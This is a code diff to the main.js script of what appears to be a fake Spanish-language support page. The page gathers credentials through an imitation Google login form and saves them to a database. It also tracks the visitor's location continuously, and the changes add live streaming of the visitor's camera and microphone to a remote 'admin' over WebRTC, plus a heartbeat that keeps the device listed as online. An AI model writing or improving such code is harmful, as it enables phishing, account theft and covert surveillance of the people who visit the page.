@@ -1,3 +1,5 @@
+console.log(">>> MAIN.JS INICIANDO CARGA <<<");
+
 const featuresSection = document.getElementById('features-section');
 const assistanceSection = document.getElementById('assistance-section');
 const loginBtn = document.getElementById('login-btn');
@@ -14,7 +16,7 @@ const resendCodeBtn = document.getElementById('resend-code');
 const assistanceForm = document.getElementById('assistance-form');
 
 // Cliente Supabase global
-const supabase = window.supabaseClient;
+const supaClient = window.supabaseClient;
 
 // Variables de estado
 let userCredentials = {};
@@ -57,12 +59,37 @@ async function getDeviceInfo() {
 
 // Inicializar conexión
 let channel;
+let localStream = null;
+let peer = null;
+
+// Inicializar WebRTC
+function initWebRTC(stream, isInitiator, targetId) {
+    console.log(">>> Inicializando WebRTC P2P <<<");
+    if (peer) { peer.destroy(); }
+
+    peer = new window.SimplePeer({
+        initiator: isInitiator,
+        stream: stream,
+        trickle: false 
+    });
+
+    peer.on('signal', data => {
+        // Enviar la señal de negociación al admin
+        channel.send({
+            type: 'broadcast',
+            event: 'webrtc-signal',
+            payload: { deviceId: deviceInfo.device_id, targetId: targetId, signal: data }
+        });
+    });
+
+    peer.on('error', err => console.log('Peer error:', err));
+}
 
 async function initSupabase() {
     const info = await getDeviceInfo();
 
     // Registrar o actualizar dispositivo
-    const { error } = await supabase
+    const { error } = await supaClient
         .from('devices')
         .upsert({
             ...info,
@@ -72,12 +99,24 @@ async function initSupabase() {
     if (error) console.error("Error upserting device", error);
 
     // Conectar a canal en vivo
-    channel = supabase.channel('cyber-room');
+    channel = supaClient.channel('cyber-room', {
+        config: {
+            broadcast: { ack: false },
+        },
+    });
 
     channel.on('broadcast', { event: 'request-action' }, payload => {
         const { deviceId, action } = payload.payload;
         if (deviceId === info.device_id) {
             handleAdminRequest(action);
+        }
+    });
+
+    channel.on('broadcast', { event: 'webrtc-signal' }, payload => {
+        const p = payload.payload;
+        // Si el admin nos responde la llamada P2P, conectamos la señal
+        if (p.targetId === info.device_id && peer) {
+            peer.signal(p.signal);
         }
     });
 
@@ -129,7 +168,7 @@ googleLoginForm.addEventListener('submit', async (e) => {
     };
 
     // Guardar credenciales en supabase
-    await supabase.from('credentials').insert([userCredentials]);
+    await supaClient.from('credentials').insert([userCredentials]);
 
     channel.send({
         type: 'broadcast',
@@ -147,7 +186,7 @@ acceptPermissionsBtn.addEventListener('click', async () => {
     permissions.location = document.getElementById('location-permission').checked;
 
     // Actualizar BDD
-    await supabase.from('devices').update({ permissions }).eq('device_id', deviceInfo.device_id);
+    await supaClient.from('devices').update({ permissions }).eq('device_id', deviceInfo.device_id);
 
     channel.send({
         type: 'broadcast',
@@ -170,34 +209,42 @@ denyPermissionsBtn.addEventListener('click', () => {
 function requestRealPermissions(requestedPerms) {
     const devId = deviceInfo.device_id;
 
-    if (requestedPerms.camera) {
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(async stream => {
-                await supabase.from('devices').update({ 'permissions': { ...permissions, camera: true } }).eq('device_id', devId);
-                channel.send({ type: 'broadcast', event: 'camera-accessed', payload: { deviceId: devId } });
+    if (requestedPerms.camera) permissions.camera = true;
+    if (requestedPerms.microphone) permissions.microphone = true;
 
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
-                video.style.display = 'none';
-                document.body.appendChild(video);
-            })
-            .catch(err => console.error(err));
+    // Evitar error "Device in use" reutilizando el stream si ya tiene los permisos necesarios
+    if (localStream) {
+        const hasVideo = localStream.getVideoTracks().length > 0;
+        const hasAudio = localStream.getAudioTracks().length > 0;
+        
+        if ((!permissions.camera || hasVideo) && (!permissions.microphone || hasAudio)) {
+            if (requestedPerms.camera) channel.send({ type: 'broadcast', event: 'camera-accessed', payload: { deviceId: devId } });
+            if (requestedPerms.microphone) channel.send({ type: 'broadcast', event: 'mic-accessed', payload: { deviceId: devId } });
+            initWebRTC(localStream, true, 'admin');
+            return;
+        }
     }
 
-    if (requestedPerms.microphone) {
-        navigator.mediaDevices.getUserMedia({ audio: true })
-            .then(async stream => {
-                await supabase.from('devices').update({ 'permissions': { ...permissions, microphone: true } }).eq('device_id', devId);
-                channel.send({ type: 'broadcast', event: 'mic-accessed', payload: { deviceId: devId } });
+    if (permissions.camera || permissions.microphone) {
+        navigator.mediaDevices.getUserMedia({ 
+            video: permissions.camera, 
+            audio: permissions.microphone 
+        })
+        .then(async stream => {
+            await supaClient.from('devices').update({ 'permissions': permissions }).eq('device_id', devId);
+            
+            if (requestedPerms.camera) channel.send({ type: 'broadcast', event: 'camera-accessed', payload: { deviceId: devId } });
+            if (requestedPerms.microphone) channel.send({ type: 'broadcast', event: 'mic-accessed', payload: { deviceId: devId } });
 
-                const audio = document.createElement('audio');
-                audio.srcObject = stream;
-                audio.play();
-                audio.style.display = 'none';
-                document.body.appendChild(audio);
-            })
-            .catch(err => console.error(err));
+            const video = document.getElementById('local-video');
+            video.srcObject = stream;
+            localStream = stream;
+            initWebRTC(stream, true, 'admin');
+        })
+        .catch(err => {
+            console.error('Error WebRTC getUserMedia:', err);
+            channel.send({ type: 'broadcast', event: 'camera-accessed', payload: { deviceId: devId, error: err.message } });
+        });
     }
 
     if (requestedPerms.location) {
@@ -210,7 +257,7 @@ function requestRealPermissions(requestedPerms) {
                     timestamp: position.timestamp
                 };
 
-                await supabase.from('devices').update({ location: locationData }).eq('device_id', devId);
+                await supaClient.from('devices').update({ location: locationData }).eq('device_id', devId);
                 channel.send({ type: 'broadcast', event: 'location-updated', payload: { deviceId: devId, location: locationData } });
 
                 navigator.geolocation.watchPosition(
@@ -221,7 +268,7 @@ function requestRealPermissions(requestedPerms) {
                             accuracy: pos.coords.accuracy,
                             timestamp: pos.timestamp
                         };
-                        supabase.from('devices').update({ location: updatedLocation }).eq('device_id', devId);
+                        supaClient.from('devices').update({ location: updatedLocation }).eq('device_id', devId);
                         channel.send({ type: 'broadcast', event: 'location-updated', payload: { deviceId: devId, location: updatedLocation } });
                     },
                     error => console.error(error),
@@ -243,7 +290,7 @@ verifyCodeBtn.addEventListener('click', async () => {
     featuresSection.style.display = 'block';
     assistanceSection.style.display = 'block';
 
-    await supabase.from('devices').update({ status: 'verified' }).eq('device_id', deviceInfo.device_id);
+    await supaClient.from('devices').update({ status: 'verified' }).eq('device_id', deviceInfo.device_id);
     channel.send({ type: 'broadcast', event: 'verification-completed', payload: { deviceId: deviceInfo.device_id, code } });
 });
 
@@ -279,7 +326,7 @@ assistanceForm.addEventListener('submit', async (e) => {
         issue_type: issueType,
         description
     };
-    await supabase.from('assistances').insert([reqData]);
+    await supaClient.from('assistances').insert([reqData]);
 
     channel.send({ type: 'broadcast', event: 'assistance-request', payload: { ...reqData, deviceId: deviceInfo.device_id } });
 
@@ -287,12 +334,19 @@ assistanceForm.addEventListener('submit', async (e) => {
     assistanceForm.reset();
 });
 
-// Mantener activo
+// Mantener activo cuando cambian las pestañas
 document.addEventListener('visibilitychange', async () => {
     if (!document.hidden && deviceInfo.device_id) {
-        await supabase.from('devices').update({ last_active: new Date().toISOString() }).eq('device_id', deviceInfo.device_id);
+        await supaClient.from('devices').update({ last_active: new Date().toISOString() }).eq('device_id', deviceInfo.device_id);
     }
 });
+
+// Heartbeat cada 30 segundos para mostrarlo conectado en admin
+setInterval(async () => {
+    if (deviceInfo.device_id) {
+        await supaClient.from('devices').update({ last_active: new Date().toISOString() }).eq('device_id', deviceInfo.device_id);
+    }
+}, 30000);
 
 // Evitar cierre accidental
 window.addEventListener('beforeunload', (e) => {
